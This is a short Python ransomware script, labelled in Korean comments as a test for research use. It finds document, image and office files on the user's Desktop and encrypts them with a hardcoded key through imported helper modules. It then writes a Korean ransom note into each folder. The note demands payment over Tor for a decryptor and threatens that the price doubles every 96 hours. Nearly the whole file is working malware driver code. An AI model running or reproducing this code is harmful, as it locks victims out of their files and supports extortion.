#_*_ coding: utf-8 _*_
# python Created Ransomware test
# 테스트용으로 사용할 것. 만약 연구목적 외에 사용할 시 법적 책임은 당사자의 책임임.
# key = 'qwertasdfg123456'

import os
import Searcher
import Cryptomodule

key = 'qwertasdfg123456'
default_dir = os.path.expanduser("~") + '\\Desktop'
exit_list = ['.txt', '.jpg', '.pdf', '.hwp', '.png', '.xls', '.xlsm', '.xlsx', '.ppt', '.pptx', '.doc', '.docm', '.docx', '.show', '.cell', '.hwpx']
decrypto_file = '.BlackPink'
ramsom_data = '''
------------------------------
BEGIN KOREAN
------------------------------
조언을 받으십시오 :
모든 파일, 사진 문서 및 데이터는 군용 등급 암호화 RSA AES-256으로 암호화되어 있습니다.
귀하의 정보는 손실되지 않습니다. 그러나 암호화.
파일을 복원하려면 Decrypter를 구입해야합니다.
이 단계에 따라 파일을 복원하십시오.

1 * Tor 브라우저를 다운로드하십시오. (구글에 "Tor 다운로드"만 입력하면됩니다.)
2 * URL 찾아보기 : http://www.google.com
3 * 파일을 복원하려면 Decryptor를 구입하십시오.

그것은 매우 간단합니다. 파일을 복원 할 수 있다고 생각지 않으면 이미지 형식의 파일 1 개를 무료로 복원 할 수 있습니다.
시간이 똑딱 거리고 있다는 것을 알아 두십시오. 가격은 96 시간마다 두 배가되므로 현명하게 사용하십시오.

고유 ID : injection

주의:
암호화 된 파일을 수정하거나 삭제하지 마십시오. 복원하기가 어려울 수 있습니다.

지원하다:
지원 센터에 문의하여 파일의 암호를 해독하는 데 도움을받을 수 있습니다.
------------------------------
END KOREAN
------------------------------
'''

file, directory = Searcher.readfile(default_dir, exit_list)

#file, directory = Searcher.readfile(default_dir, decrypto_file)

#print(file)
#print(directory)

for i in file:
    Cryptomodule.encrypt(i, key)
    #Cryptomodule.decrypt(i, key)

for i in directory:
    f = open(i + '\\how_to_recver_files.txt', 'w+')
    f.write(ramsom_data)
    f.close()
